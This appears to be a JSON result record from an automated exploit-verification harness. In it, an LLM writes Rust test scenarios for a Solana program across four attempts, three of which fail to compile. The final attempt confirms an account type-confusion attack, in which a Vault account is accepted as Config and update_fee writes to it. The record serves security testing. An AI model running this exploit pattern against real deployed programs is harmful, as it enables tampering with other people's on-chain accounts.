@@ -1,0 +1,175 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: fee gravado na conta de vault (tipo incorreto)",
+  "attempts_used": 4,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2589,
+        "completion_tokens": 753,
+        "latency_s": 4.21
+      },
+      "raw": "{\n  \"plan\": \"O cenário monta uma conta `config` legítima com o layout esperado (discriminador de config + admin + fee) e uma conta de outro tipo (ex.: vault) cujo layout tem, nos bytes 8..40, a pubkey do atacante. O baseline chama `update_fee` com a conta de config legítima e a autoridade correta, provando que o cenário está correto. O ataque chama `update_fee` passando a conta de vault no lugar da config, com o atacante como signer. O efeito mede se o fee foi gravado na conta de vault (bytes 40..48), demonstrando que uma conta de tipo incorreto foi aceita como config.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta de config legítima: discriminador de config + admin + fee inicial\\nlet admin = Pubkey::new_unique();\\nlet config_data = anchor_account_data(\\\"Config\\\", &(admin, 100u64));\\nlet config = account(&program_id, &config_data, None);\\n\\n// Conta de outro tipo (vault) com layout compatível: bytes 8..40 = pubkey do atacante\\nlet attacker = Pubkey::new_unique();\\nlet vault_data = anchor_account_data(\\\"Vault\\\", &(attacker, 0u64));\\nlet vault = account(&program_id, &vault_data, None);\\n\\n// Conta de autoridade legítima (admin)\\nlet authority = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com a conta de config correta\\nlet ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n]);\\nlet contas_baseline = &[\\n    (config_key, config.clone()),\\n    (admin, authority.clone()),\\n];\\nlet r_base = env.baseline(\\\"update_fee legítimo\\\", &ix_baseline, contas_baseline);\\n\\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\\nlet ix_attack = env.raw_ix(&[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0], &[\\n    AccountMeta::new(vault_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n]);\\nlet contas_attack = &[\\n    (vault_key, vault.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com conta de vault\\\", &ix_attack, contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_key);\\n    env.effect(\\\"fee gravado na conta de vault (tipo incorreto)\\\", read_u64(vault_after.data(), 40) == 999);\\n}\"\n}",
+      "plan": "O cenário monta uma conta `config` legítima com o layout esperado (discriminador de config + admin + fee) e uma conta de outro tipo (ex.: vault) cujo layout tem, nos bytes 8..40, a pubkey do atacante. O baseline chama `update_fee` com a conta de config legítima e a autoridade correta, provando que o cenário está correto. O ataque chama `update_fee` passando a conta de vault no lugar da config, com o atacante como signer. O efeito mede se o fee foi gravado na conta de vault (bytes 40..48), demonstrando que uma conta de tipo incorreto foi aceita como config.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta de config legítima: discriminador de config + admin + fee inicial\nlet admin = Pubkey::new_unique();\nlet config_data = anchor_account_data(\"Config\", &(admin, 100u64));\nlet config = account(&program_id, &config_data, None);\n\n// Conta de outro tipo (vault) com layout compatível: bytes 8..40 = pubkey do atacante\nlet attacker = Pubkey::new_unique();\nlet vault_data = anchor_account_data(\"Vault\", &(attacker, 0u64));\nlet vault = account(&program_id, &vault_data, None);\n\n// Conta de autoridade legítima (admin)\nlet authority = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com a conta de config correta\nlet ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(admin, true),\n]);\nlet contas_baseline = &[\n    (config_key, config.clone()),\n    (admin, authority.clone()),\n];\nlet r_base = env.baseline(\"update_fee legítimo\", &ix_baseline, contas_baseline);\n\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\nlet ix_attack = env.raw_ix(&[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0], &[\n    AccountMeta::new(vault_key, false),\n    AccountMeta::new_readonly(attacker, true),\n]);\nlet contas_attack = &[\n    (vault_key, vault.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com conta de vault\", &ix_attack, contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_key);\n    env.effect(\"fee gravado na conta de vault (tipo incorreto)\", read_u64(vault_after.data(), 40) == 999);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:26:26\n   |\n26 |         AccountMeta::new(config_key, false),\n   |                          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:30:10\n   |\n30 |         (config_key, config.clone()),\n   |          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:37:26\n   |\n37 |         AccountMeta::new(vault_key, false),\n   |                          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:41:10\n   |\n41 |         (vault_key, vault.clone()),\n   |          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:47:38\n   |\n47 |         let vault_after = after(&r, &vault_key);\n   |                                      ^^^^^^^^^ not found in this scope\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:25:69\n    |\n 25 |       let ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\n    |  ___________________________------____________________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 26 | |         AccountMeta::new(config_key, false),\n 27 | |         AccountMeta::new_readonly(admin, true),\n 28 | |     ]);",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:26:26\n   |\n26 |         AccountMeta::new(config_key, false),\n   |                          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:30:10\n   |\n30 |         (config_key, config.clone()),\n   |          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:37:26\n   |\n37 |         AccountMeta::new(vault_key, false),\n   |                          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:41:10\n   |\n41 |         (vault_key, vault.clone()),\n   |          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:47:38\n   |\n47 |         let vault_after = after(&r, &vault_key);\n   |                                      ^^^^^^^^^ not found in this scope\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:25:69\n    |\n 25 |       let ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\n    |  ___________________________------____________________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 26 | |         AccountMeta::new(config_key, false),\n 27 | |         AccountMeta::new_readonly(admin, true),\n 28 | |     ]);"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3572,
+        "completion_tokens": 728,
+        "latency_s": 3.66
+      },
+      "raw": "{\"plan\": \"Preparo uma conta de config legítima (discriminador Config + admin + fee) e uma conta de outro tipo (Vault) cujo layout em 8..40 contém a pubkey do atacante. O baseline chama update_fee com a config correta e o admin como signer, provando que o cenário está montado. O ataque passa a conta Vault no lugar da config, com o atacante como signer, e mede se o fee foi gravado na conta de tipo incorreto.\",\"scenario\":\"let program_id = env.program_id;\\n\\n// Conta de config legítima: discriminador de Config + admin + fee inicial\\nlet admin = Pubkey::new_unique();\\nlet config_key = Pubkey::new_unique();\\nlet config_data = anchor_account_data(\\\"Config\\\", &(admin, 100u64));\\nlet config = account(&program_id, &config_data, None);\\n\\n// Conta de outro tipo (Vault) com layout compatível: bytes 8..40 = pubkey do atacante\\nlet attacker = Pubkey::new_unique();\\nlet vault_key = Pubkey::new_unique();\\nlet vault_data = anchor_account_data(\\\"Vault\\\", &(attacker, 0u64));\\nlet vault = account(&program_id, &vault_data, None);\\n\\n// Conta de autoridade legítima (admin)\\nlet authority = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com a conta de config correta\\nlet ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n]);\\nlet contas_baseline = &[\\n    (config_key, config.clone()),\\n    (admin, authority.clone()),\\n];\\nlet _r_base = env.baseline(\\\"update_fee legítimo\\\", &ix_baseline, contas_baseline);\\n\\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\\nlet ix_attack = env.raw_ix(&[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0], &[\\n    AccountMeta::new(vault_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n]);\\nlet contas_attack = &[\\n    (vault_key, vault.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com conta de vault\\\", &ix_attack, contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_key);\\n    env.effect(\\\"fee gravado na conta de vault (tipo incorreto)\\\", read_u64(vault_after.data(), 40) == 999);\\n}\"}",
+      "plan": "Preparo uma conta de config legítima (discriminador Config + admin + fee) e uma conta de outro tipo (Vault) cujo layout em 8..40 contém a pubkey do atacante. O baseline chama update_fee com a config correta e o admin como signer, provando que o cenário está montado. O ataque passa a conta Vault no lugar da config, com o atacante como signer, e mede se o fee foi gravado na conta de tipo incorreto.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta de config legítima: discriminador de Config + admin + fee inicial\nlet admin = Pubkey::new_unique();\nlet config_key = Pubkey::new_unique();\nlet config_data = anchor_account_data(\"Config\", &(admin, 100u64));\nlet config = account(&program_id, &config_data, None);\n\n// Conta de outro tipo (Vault) com layout compatível: bytes 8..40 = pubkey do atacante\nlet attacker = Pubkey::new_unique();\nlet vault_key = Pubkey::new_unique();\nlet vault_data = anchor_account_data(\"Vault\", &(attacker, 0u64));\nlet vault = account(&program_id, &vault_data, None);\n\n// Conta de autoridade legítima (admin)\nlet authority = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com a conta de config correta\nlet ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(admin, true),\n]);\nlet contas_baseline = &[\n    (config_key, config.clone()),\n    (admin, authority.clone()),\n];\nlet _r_base = env.baseline(\"update_fee legítimo\", &ix_baseline, contas_baseline);\n\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\nlet ix_attack = env.raw_ix(&[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0], &[\n    AccountMeta::new(vault_key, false),\n    AccountMeta::new_readonly(attacker, true),\n]);\nlet contas_attack = &[\n    (vault_key, vault.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com conta de vault\", &ix_attack, contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_key);\n    env.effect(\"fee gravado na conta de vault (tipo incorreto)\", read_u64(vault_after.data(), 40) == 999);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:27:69\n    |\n 27 |       let ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\n    |  ___________________________------____________________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 28 | |         AccountMeta::new(config_key, false),\n 29 | |         AccountMeta::new_readonly(admin, true),\n 30 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:38:68\n    |\n 38 |       let ix_attack = env.raw_ix(&[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0], &[\n    |  _________________________------_____________________________________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 39 | |         AccountMeta::new(vault_key, false),\n 40 | |         AccountMeta::new_readonly(attacker, true),\n 41 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:27:69\n    |\n 27 |       let ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[\n    |  ___________________________------____________________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 28 | |         AccountMeta::new(config_key, false),\n 29 | |         AccountMeta::new_readonly(admin, true),\n 30 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:38:68\n    |\n 38 |       let ix_attack = env.raw_ix(&[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0], &[\n    |  _________________________------_____________________________________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 39 | |         AccountMeta::new(vault_key, false),\n 40 | |         AccountMeta::new_readonly(attacker, true),\n 41 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3530,
+        "completion_tokens": 776,
+        "latency_s": 3.76
+      },
+      "raw": "{\"plan\": \"Preparo uma conta de config legítima (discriminador Config, admin, fee) e uma conta de outro tipo (Vault) cujo layout em 8..40 contém a pubkey do atacante. O baseline chama update_fee com a config correta e o admin como signer, provando que o cenário está montado. O ataque passa a conta Vault no lugar da config, com o atacante como signer, e mede se o fee foi gravado na conta de tipo incorreto. Corrijo os metas passando Vec<AccountMeta> em vez de array.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta de config legítima: discriminador de Config + admin + fee inicial\\nlet admin = Pubkey::new_unique();\\nlet config_key = Pubkey::new_unique();\\nlet config_data = anchor_account_data(\\\"Config\\\", &(admin, 100u64));\\nlet config = account(&program_id, &config_data, None);\\n\\n// Conta de outro tipo (Vault) com layout compatível: bytes 8..40 = pubkey do atacante\\nlet attacker = Pubkey::new_unique();\\nlet vault_key = Pubkey::new_unique();\\nlet vault_data = anchor_account_data(\\\"Vault\\\", &(attacker, 0u64));\\nlet vault = account(&program_id, &vault_data, None);\\n\\n// Conta de autoridade legítima (admin)\\nlet authority = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com a conta de config correta\\nlet ix_baseline = env.raw_ix(\\n    &[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0],\\n    vec![\\n        AccountMeta::new(config_key, false),\\n        AccountMeta::new_readonly(admin, true),\\n    ],\\n);\\nlet contas_baseline = &[\\n    (config_key, config.clone()),\\n    (admin, authority.clone()),\\n];\\nlet _r_base = env.baseline(\\\"update_fee legítimo\\\", &ix_baseline, contas_baseline);\\n\\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\\nlet ix_attack = env.raw_ix(\\n    &[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0],\\n    vec![\\n        AccountMeta::new(vault_key, false),\\n        AccountMeta::new_readonly(attacker, true),\\n    ],\\n);\\nlet contas_attack = &[\\n    (vault_key, vault.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com conta de vault\\\", &ix_attack, contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_key);\\n    env.effect(\\n        \\\"fee gravado na conta de vault (tipo incorreto)\\\",\\n        read_u64(vault_after.data(), 40) == 999,\\n    );\\n}\"}",
+      "plan": "Preparo uma conta de config legítima (discriminador Config, admin, fee) e uma conta de outro tipo (Vault) cujo layout em 8..40 contém a pubkey do atacante. O baseline chama update_fee com a config correta e o admin como signer, provando que o cenário está montado. O ataque passa a conta Vault no lugar da config, com o atacante como signer, e mede se o fee foi gravado na conta de tipo incorreto. Corrijo os metas passando Vec<AccountMeta> em vez de array.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta de config legítima: discriminador de Config + admin + fee inicial\nlet admin = Pubkey::new_unique();\nlet config_key = Pubkey::new_unique();\nlet config_data = anchor_account_data(\"Config\", &(admin, 100u64));\nlet config = account(&program_id, &config_data, None);\n\n// Conta de outro tipo (Vault) com layout compatível: bytes 8..40 = pubkey do atacante\nlet attacker = Pubkey::new_unique();\nlet vault_key = Pubkey::new_unique();\nlet vault_data = anchor_account_data(\"Vault\", &(attacker, 0u64));\nlet vault = account(&program_id, &vault_data, None);\n\n// Conta de autoridade legítima (admin)\nlet authority = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com a conta de config correta\nlet ix_baseline = env.raw_ix(\n    &[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0],\n    vec![\n        AccountMeta::new(config_key, false),\n        AccountMeta::new_readonly(admin, true),\n    ],\n);\nlet contas_baseline = &[\n    (config_key, config.clone()),\n    (admin, authority.clone()),\n];\nlet _r_base = env.baseline(\"update_fee legítimo\", &ix_baseline, contas_baseline);\n\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\nlet ix_attack = env.raw_ix(\n    &[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0],\n    vec![\n        AccountMeta::new(vault_key, false),\n        AccountMeta::new_readonly(attacker, true),\n    ],\n);\nlet contas_attack = &[\n    (vault_key, vault.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com conta de vault\", &ix_attack, contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_key);\n    env.effect(\n        \"fee gravado na conta de vault (tipo incorreto)\",\n        read_u64(vault_after.data(), 40) == 999,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error: literal out of range for `u8`\n  --> tests/attempt.rs:42:16\n   |\n42 |         &[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0],\n   |                ^^^^^\n   |\n   = note: the literal `999u8` does not fit into the type `u8` whose range is `0..=255`\n   = note: `#[deny(overflowing_literals)]` on by default\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror: literal out of range for `u8`\n  --> tests/attempt.rs:42:16\n   |\n42 |         &[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0],\n   |                ^^^^^\n   |\n   = note: the literal `999u8` does not fit into the type `u8` whose range is `0..=255`\n   = note: `#[deny(overflowing_literals)]` on by default\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3342,
+        "completion_tokens": 785,
+        "latency_s": 3.7
+      },
+      "raw": "{\"plan\": \"Preparo uma conta de config legítima (discriminador Config, admin, fee) e uma conta de outro tipo (Vault) cujo layout em 8..40 contém a pubkey do atacante. O baseline chama update_fee com a config correta e o admin como signer, provando que o cenário está montado. O ataque passa a conta Vault no lugar da config, com o atacante como signer, e mede se o fee foi gravado na conta de tipo incorreto. Corrijo o literal 999u8 para um valor válido em u8 (ex.: 200u8).\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta de config legítima: discriminador de Config + admin + fee inicial\\nlet admin = Pubkey::new_unique();\\nlet config_key = Pubkey::new_unique();\\nlet config_data = anchor_account_data(\\\"Config\\\", &(admin, 100u64));\\nlet config = account(&program_id, &config_data, None);\\n\\n// Conta de outro tipo (Vault) com layout compatível: bytes 8..40 = pubkey do atacante\\nlet attacker = Pubkey::new_unique();\\nlet vault_key = Pubkey::new_unique();\\nlet vault_data = anchor_account_data(\\\"Vault\\\", &(attacker, 0u64));\\nlet vault = account(&program_id, &vault_data, None);\\n\\n// Conta de autoridade legítima (admin)\\nlet authority = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com a conta de config correta\\nlet ix_baseline = env.raw_ix(\\n    &[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0],\\n    vec![\\n        AccountMeta::new(config_key, false),\\n        AccountMeta::new_readonly(admin, true),\\n    ],\\n);\\nlet contas_baseline = &[\\n    (config_key, config.clone()),\\n    (admin, authority.clone()),\\n];\\nlet _r_base = env.baseline(\\\"update_fee legítimo\\\", &ix_baseline, contas_baseline);\\n\\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\\nlet ix_attack = env.raw_ix(\\n    &[0u8, 200u8, 0, 0, 0, 0, 0, 0, 0],\\n    vec![\\n        AccountMeta::new(vault_key, false),\\n        AccountMeta::new_readonly(attacker, true),\\n    ],\\n);\\nlet contas_attack = &[\\n    (vault_key, vault.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com conta de vault\\\", &ix_attack, contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_key);\\n    env.effect(\\n        \\\"fee gravado na conta de vault (tipo incorreto)\\\",\\n        read_u64(vault_after.data(), 40) == 200,\\n    );\\n}\"}",
+      "plan": "Preparo uma conta de config legítima (discriminador Config, admin, fee) e uma conta de outro tipo (Vault) cujo layout em 8..40 contém a pubkey do atacante. O baseline chama update_fee com a config correta e o admin como signer, provando que o cenário está montado. O ataque passa a conta Vault no lugar da config, com o atacante como signer, e mede se o fee foi gravado na conta de tipo incorreto. Corrijo o literal 999u8 para um valor válido em u8 (ex.: 200u8).",
+      "scenario": "let program_id = env.program_id;\n\n// Conta de config legítima: discriminador de Config + admin + fee inicial\nlet admin = Pubkey::new_unique();\nlet config_key = Pubkey::new_unique();\nlet config_data = anchor_account_data(\"Config\", &(admin, 100u64));\nlet config = account(&program_id, &config_data, None);\n\n// Conta de outro tipo (Vault) com layout compatível: bytes 8..40 = pubkey do atacante\nlet attacker = Pubkey::new_unique();\nlet vault_key = Pubkey::new_unique();\nlet vault_data = anchor_account_data(\"Vault\", &(attacker, 0u64));\nlet vault = account(&program_id, &vault_data, None);\n\n// Conta de autoridade legítima (admin)\nlet authority = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com a conta de config correta\nlet ix_baseline = env.raw_ix(\n    &[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0],\n    vec![\n        AccountMeta::new(config_key, false),\n        AccountMeta::new_readonly(admin, true),\n    ],\n);\nlet contas_baseline = &[\n    (config_key, config.clone()),\n    (admin, authority.clone()),\n];\nlet _r_base = env.baseline(\"update_fee legítimo\", &ix_baseline, contas_baseline);\n\n// Ataque: passa a conta de vault no lugar da config, com o atacante como signer\nlet ix_attack = env.raw_ix(\n    &[0u8, 200u8, 0, 0, 0, 0, 0, 0, 0],\n    vec![\n        AccountMeta::new(vault_key, false),\n        AccountMeta::new_readonly(attacker, true),\n    ],\n);\nlet contas_attack = &[\n    (vault_key, vault.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com conta de vault\", &ix_attack, contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_key);\n    env.effect(\n        \"fee gravado na conta de vault (tipo incorreto)\",\n        read_u64(vault_after.data(), 40) == 200,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legítimo",
+            "result": "Success",
+            "compute_units": 321,
+            "account_flags": "-w,sr",
+            "ix_head": "0032000000000000",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "9b0caae01efacc82",
+                "digest": "d3514dec04f06f91",
+                "post": "9b0caae01efacc8200000000000000020000000000000000000000000000000000000000000000003200000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com conta de vault",
+            "result": "Success",
+            "compute_units": 321,
+            "account_flags": "-w,sr",
+            "ix_head": "00c8000000000000",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "d308e82b02987577",
+                "digest": "3a7cf81753a5dc5e",
+                "post": "d308e82b029875770000000000000004000000000000000000000000000000000000000000000000c800000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "fee gravado na conta de vault (tipo incorreto)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 321 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 321 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: fee gravado na conta de vault (tipo incorreto)"
+    }
+  ],
+  "case_id": "SSP-06-P-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let data = config.try_borrow_data()?;\nlet admin = read_pubkey(&data[8..40]);",
+    "explanation": "Os dados da conta `config` sao desserializados manualmente a partir de `AccountInfo` sem validar um discriminador de tipo unico. Nao ha verificacao de que os bytes iniciais (0..8) correspondem ao tipo esperado de conta de configuracao, permitindo que uma conta de outro tipo com layout compativel seja passada como config.",
+    "attack_hypothesis": "O atacante fornece uma conta de um tipo diferente (por exemplo, uma conta de usuario ou de vault) cujo layout de bytes nas posicoes 8..40 coincida com a pubkey do atacante, fazendo o programa interpreta-la como conta de configuracao e permitindo a alteracao indevida do campo de fee em uma conta de tipo incorreto."
+  }
+}
